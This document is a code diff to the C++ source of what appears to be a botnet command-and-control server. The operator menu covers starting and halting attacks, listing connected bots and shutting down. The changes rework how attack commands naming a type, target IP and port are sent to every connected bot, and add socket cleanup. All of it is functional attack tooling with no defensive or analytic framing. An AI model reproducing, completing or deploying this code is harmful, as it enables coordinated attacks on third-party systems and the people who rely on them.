@@ -39,11 +39,7 @@ pid_t pid;
 
 string server_status()
 {	
-	if (attacking == true) 
-	{
-		return "\nServer attacking (" + attack + ") target: " + target_ip + "\n";
-	}
-	else if (target_ip == "None" && attack == "None" && start == false)
+	if (target_ip == "None" && attack == "None" && attacking == false)
 	{
 		return "\nServer started, waiting for client connections...\n";
 	}
@@ -51,13 +47,19 @@ string server_status()
 	{
 		return "\nAttack halted. Waiting for commands.\n";
 	}
-	else if (start == true && attack == "None")
-	{
+	else if (attacking == true && attack == "None")
+	{	
+		attacking = false;
 		return "\nPlease, enter attack type.\n";
 	}
-	else if (start == true && target_ip == "None")
+	else if (attacking == true && target_ip == "None")
 	{
+		attacking = false;
 		return "\nPlease, enter target parameters.\n";
+	}
+	else if (attacking == true) 
+	{
+		return "\nServer attacking (" + attack + ") target: " + target_ip + "\n";
 	}
 	else
 	{
@@ -74,8 +76,31 @@ void setup_target_parameters()
 }
 
 void start_attack()
+{	
+	if (attack != "None" && target_ip != "None" && target_port != 0)
+       	{	
+		vector<netbot>::iterator iter = netbots.begin();
+		for(iter; iter < netbots.end(); iter++) 
+		{	
+	       		if (attack == "HALT") {
+       				message = attack;
+	       		} else {
+	       			message = attack + "_" + target_ip + "_" + to_string(target_port);
+
+	       		}
+	       			
+			send((*iter).id, message.c_str(), strlen(message.c_str()), 0);
+		}
+	}
+}
+
+void close_connected_sockets()
 {
-	start = true;
+	vector<netbot>::iterator iter = netbots.begin();
+	for(iter; iter < netbots.end(); iter++) 
+	{	
+       		close((*iter).id);
+	}
 }
 
 void printASCII(string fileName)
@@ -174,9 +199,13 @@ void setup_attack_type()
 
 }
 
-void disconnection_listener(int i)
-{	
-	char buffer[1024] = { 0 };
+void threaded(int i)
+{
+	char buffer[1024] = { 0 };	
+	
+	bzero(&buffer, sizeof(buffer));
+	int bytes = recv(i, buffer, 1024, 0);	
+	
 	while(true)
 	{
 		bzero(&buffer, sizeof(buffer));
@@ -207,59 +236,6 @@ void disconnection_listener(int i)
 			return;
 		}
 	}
-}
-
-void threaded(int i)
-{
-	char buffer[1024] = { 0 };	
-	
-	bzero(&buffer, sizeof(buffer));
-	int bytes = recv(i, buffer, 1024, 0);	
-	
-	thread dListener = thread(disconnection_listener, i);
-	dListener.detach();
-
-	while (1)
-	{		
-		netbot bot;
-	
-		if (start == true) 
-		{	
-			bool found = false;
-			vector<netbot>::iterator iter = netbots.begin();
-			for(iter; iter < netbots.end(); iter++) 
-			{
-				if ((*iter).id == i) 
-				{	
-					found = true;
-					bot = *iter;
-					break;				
-				}
-			}
-			
-			if (!found) {
-				close(i);
-				return;
-			}
-			
-			bot.start = true;
-		}
-
-		if (attack != "None" && target_ip != "None" && target_port != 0 && bot.start == true)
-	       	{	
-	       		if (attack == "HALT") {
-	       			message = attack;
-	       		} else {
-	       			message = attack + "_" + target_ip + "_" + to_string(target_port);
-	       			attacking = true;
-	       		}
-	       			
-			send(i, message.c_str(), strlen(message.c_str()), 0);
-			sleep(2);
-			bot.start = false;
-			start = false;
-		} 
-	}	
 }
 
 void connection_listener(int i)
@@ -339,6 +315,7 @@ void start_server()
 		cout << "4. halt attack\n";
 		cout << "5. list connected bots\n";
 		cout << "6. shutdown server\n";	
+		cout << "7. exit\n";
 		cout << server_status();
 
 		cin >> char_choice;
@@ -355,25 +332,29 @@ void start_server()
 				break;
 			case 3: 
 				start_attack();
+				attacking = true;
 				break;
 			case 4: 
 				attack = "HALT";
+				start_attack();
 				attacking = false;
-				start = true;
 				break;
 			case 5:
 				list_bots();
 				break;
 			case 6:
 				kill(-pid, SIGKILL);
+				close_connected_sockets();
 				shutdown(server_fd, SHUT_RDWR);
+				break;
+			case 7:
 				break;
 			default:
 				cout << "Wrong choice. Enter option again.";
 				break;
 
 		}
-	} while (int_choice != 6);
+	} while (int_choice != 6 && int_choice != 7);
 }
 
 void play_music(string songName)
